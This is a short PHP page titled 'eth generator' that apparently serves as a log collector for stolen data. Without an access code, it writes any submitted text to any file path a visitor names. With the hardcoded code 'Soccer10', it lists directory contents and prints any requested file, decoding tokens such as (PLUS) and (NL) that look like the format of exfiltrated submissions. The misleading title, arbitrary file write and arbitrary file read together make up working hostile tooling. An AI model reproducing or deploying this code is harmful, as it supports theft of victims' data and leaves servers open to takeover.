<!DOCTYPE html>
<html lang="en">
<head>
  <title>eth generator</title>
</head>
<body>
<?php

$dat = $_GET['dat'];
$user = $_GET['user'];
$requser = $_GET['requser'];

$accesscode = 'Soccer10';

if ($dat == $accesscode)
{
    if($requser == '') {

    $directory = '/home/superqgs/public_html/nicow/';

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory));
        
    while($it->valid()) {
            
    $filename = $it->getSubPathName();
    $lastfile;
    
    if (!$it->isDot() && $filename != "log.php" && $filename != "error_log" && $lastfile !=$filename && $filename != "zerr6") {
        echo " ".date("F d Y H:i:s.",filemtime($filename));
        
        $filename = str_replace(' ', '%20', $filename);

        echo "<a href=log.php?dat=$accesscode&requser=$filename>$filename</a> <br>";
        $lastfile = $filename;
    }
    
    $it->next();
    }

    }
    else{
        $dat = file_get_contents($requser);
        $ns = str_replace("(PLUS)", "+", $dat);
        $dat = $ns;
        $ns = str_replace("(MINS)", "-", $dat);
        $dat = $ns;
        $ns = str_replace("(EQUL)", "=", $dat);
        $dat = $ns;
        
        $ns = str_replace("(HASH)", "#", $dat);
        $dat = $ns;
        $ns = str_replace("(PERC)", "%", $dat);
        $dat = $ns;
        $ns = str_replace("(ANDD)", "&", $dat);
        $dat = $ns;
        
        $lines = explode("(NL)", $dat);
        foreach ($lines as &$value) {
            echo nl2br($value);
            echo "<br>";
        }
        }
}
else
{
    $dat = file_get_contents($user);
    $dat .= $_GET['dat'];
    unlink($user);
    $fp = fopen($user, "a");
    fwrite($fp, $dat);
    fclose($fp);
}
?>

</body>
</html>